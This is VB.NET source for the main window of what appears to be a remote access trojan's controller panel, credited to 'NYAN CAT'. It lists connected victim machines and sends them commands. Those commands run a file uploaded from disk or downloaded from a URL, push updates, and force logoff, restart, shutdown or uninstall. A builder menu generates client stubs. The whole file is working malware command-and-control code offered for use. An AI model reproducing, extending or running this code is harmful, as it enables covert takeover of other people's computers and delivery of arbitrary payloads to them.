

'#########################################'
'#░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░#'
'#░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░#'
'#░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░#'
'#░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░#'
'#░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░#'
'#░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░#'
'#░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░#'
'#░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░#'
'#░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░#'
'#░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░#'
'#░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░#
'#░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░#'
'#░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░#'
'#########################################'
'By NYAN CAT

Public Class Form1
    Public WithEvents S As SK
    Public RKEY As String = "[L]"

    Private Sub S_Data(ByVal u As USER, ByVal b() As Byte) Handles S.Data
        Dim DATA As String() = Split(BS(b), RKEY)
        Try
            Select Case DATA(0)
                Case "Cinfo" ' hello func
                    SyncLock ListView1.Items
                        u.L = ListView1.Items.Add(u.IP, "", "")
                        u.L.Tag = u
                        u.L.SubItems(id.Index).Text = DATA(1)
                        Try
                            For i As Integer = 1 To DATA.Length - 1
                                u.L.SubItems.Add(DATA(i))
                                u.L.SubItems(ip.Index).Text = u.IP.Split(":")(0)
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            For i = 0 To ListView1.Items.Count - 1
                                If ListView1.Items(i).SubItems(8).Text = "Yes" Then
                                    ListView1.Items(i).ForeColor = Color.Red
                                End If
                            Next
                        Catch ex2 As Exception
                        End Try
                        Fix()
                    End SyncLock

                Case "PP"
                    SyncLock ListView1.Items
                        u.IsPinged = False
                        u.L.SubItems(hping.Index).Text = u.MS & "ms"
                        u.MS = 0
                    End SyncLock

            End Select
        Catch ex As Exception
        End Try
    End Sub
    Private Sub S_Disconnected(ByVal u As USER) Handles S.Disconnected
        SyncLock ListView1.Items
            Try
                ListView1.Items(u.IP).Remove()
                Fix()
            Catch ex As Exception
            End Try

        End SyncLock
    End Sub

    Private Sub FromDiskToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromDiskToolStripMenuItem1.Click
        Try
            Dim o As New OpenFileDialog
            With o
                .Filter = "All Type (*.*)|*.*"
                .Title = "Select a File"
            End With
            o.ShowDialog()

            Dim n As New IO.FileInfo(o.FileName)
            If o.FileName.Length > 0 Then
                For Each Client As ListViewItem In ListView1.SelectedItems
                    S.Send(Client.Tag, "RunDisk" & RKEY & n.Name & RKEY & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub


    Private Sub FromURLToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromURLToolStripMenuItem1.Click
        Try
            Dim URL As String = InputBox("Enter the direct link", "Run File", "http://site.com/file.exe")
            If String.IsNullOrEmpty(URL) Then
                Exit Sub
            Else
                For Each Client As ListViewItem In ListView1.SelectedItems
                    S.Send(Client.Tag, "RunURL" & RKEY & URL)
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem.Click
        Try
            Dim MyFile As New OpenFileDialog
            With MyFile
                .Filter = "(*.exe)|*.exe"
                .Title = "UPDATE"
            End With
            MyFile.ShowDialog()
            Dim n As New IO.FileInfo(MyFile.FileName)
            If MyFile.FileName.Length > 0 Then
                For Each Client As ListViewItem In ListView1.SelectedItems
                    S.Send(Client.Tag, "UpdateDisk" & RKEY & n.Name & RKEY & Convert.ToBase64String(IO.File.ReadAllBytes(MyFile.FileName)))
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub FromURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem.Click
        Try
            Dim URL As String = InputBox("Enter the direct link", "UPDATE", "http://site.com/file.exe")
            If String.IsNullOrEmpty(URL) Then

                Exit Sub
            Else
                For Each Client As ListViewItem In ListView1.SelectedItems
                    S.Send(Client.Tag, "UpdateURL" & RKEY & URL)
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub RestartToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RestartToolStripMenuItem1.Click
        Try
            For Each Client As ListViewItem In ListView1.SelectedItems
                S.Send(Client.Tag, "Reconnect")
            Next
        Catch ex As Exception
        End Try
    End Sub

    Private Sub UninstallToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UninstallToolStripMenuItem1.Click
        Try
            Dim result As Integer = MessageBox.Show("Are you sure you want to uninstall?", "Uninstall", MessageBoxButtons.YesNo, MessageBoxIcon.Question)
            If result = DialogResult.Yes Then
                For Each Client As ListViewItem In ListView1.SelectedItems
                    S.Send(Client.Tag, "Uni")
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub CloseToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseToolStripMenuItem.Click
        Try
            For Each Client As ListViewItem In ListView1.SelectedItems
                S.Send(Client.Tag, "Close")
            Next
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Me.ToolStripStatusLabel1.Text = "Port [ pp ] Online[ oo ] Select[ ss ]".Replace("oo", ListView1.Items.Count).Replace("pp", Form2.PN.Text).Replace("ss", ListView1.SelectedItems.Count)
    End Sub

    Private Sub LogoffToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LogoffToolStripMenuItem.Click
        Try
            For Each Client As ListViewItem In ListView1.SelectedItems
                S.Send(Client.Tag, "Logoff")
            Next
        Catch ex As Exception
        End Try
    End Sub

    Private Sub ToolStripMenuItem3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem3.Click
        Try
            For Each Client As ListViewItem In ListView1.SelectedItems
                S.Send(Client.Tag, "Restart")
            Next
        Catch ex As Exception
        End Try
    End Sub

    Private Sub ShutdownToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShutdownToolStripMenuItem.Click
        Try
            For Each Client As ListViewItem In ListView1.SelectedItems
                S.Send(Client.Tag, "Shutdown")
            Next
        Catch ex As Exception
        End Try
    End Sub

    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
        MsgBox("Coded by : NYAN CAT")
    End Sub

    Public Function BS(ByVal b As Byte()) As String
        Return System.Text.Encoding.Default.GetString(b)
    End Function

    Private Sub BuilderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BuilderToolStripMenuItem.Click
        Builder.ShowDialog()
    End Sub

#Region "Theme"


    Private Sub Form1_Activated(sender As Object, e As EventArgs) Handles Me.Activated
        Opacity = 0.95
    End Sub

    Private Sub Form1_Deactivate(sender As Object, e As EventArgs) Handles Me.Deactivate
        Opacity = 0.8
    End Sub

    Private Sub Form1_Load_1(sender As Object, e As EventArgs) Handles MyBase.Load
        ToolStripStatusLabel1.Visible = False

        Dim iCount As Integer
        For iCount = 0 To 95 Step 10
            Me.Opacity = iCount / 100
            Me.Refresh()
            Threading.Thread.Sleep(50)
        Next

        Control.CheckForIllegalCrossThreadCalls = False
        Try
            S = New SK(Form2.PN.Text)
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            End
        End Try
        ToolStripStatusLabel1.Visible = True
    End Sub

    Private Sub ListView1_DrawColumnHeader(ByVal sender As Object, ByVal e As DrawListViewColumnHeaderEventArgs) Handles ListView1.DrawColumnHeader
        Using br = New SolidBrush(Color.FromArgb(20, 20, 20))
            e.DrawBackground()
            e.Graphics.FillRectangle(Brushes.Lime, e.Bounds)
            Dim headerFont As New Font("Microsoft Sans Serif", 8, FontStyle.Bold)
            e.Graphics.DrawString(e.Header.Text, headerFont, br, e.Bounds)
        End Using
    End Sub

    Private Sub ListView1_DrawItem(sender As Object, e As DrawListViewItemEventArgs) Handles ListView1.DrawItem
        e.DrawDefault = True
        If (e.ItemIndex Mod 2) = 1 Then
            e.Item.BackColor = Color.FromArgb(20, 20, 20)
            e.Item.UseItemStyleForSubItems = True
        End If
    End Sub


    Private Sub Fix()
        ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
    End Sub

    Private Sub ListView1_Resize(sender As Object, e As EventArgs) Handles ListView1.Resize
        Fix()
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Dim iCount As Integer
        For iCount = 95 To 0 Step -10
            Me.Opacity = iCount / 100
            Me.Refresh()
            Threading.Thread.Sleep(50)
        Next
        End
    End Sub
#End Region

End Class


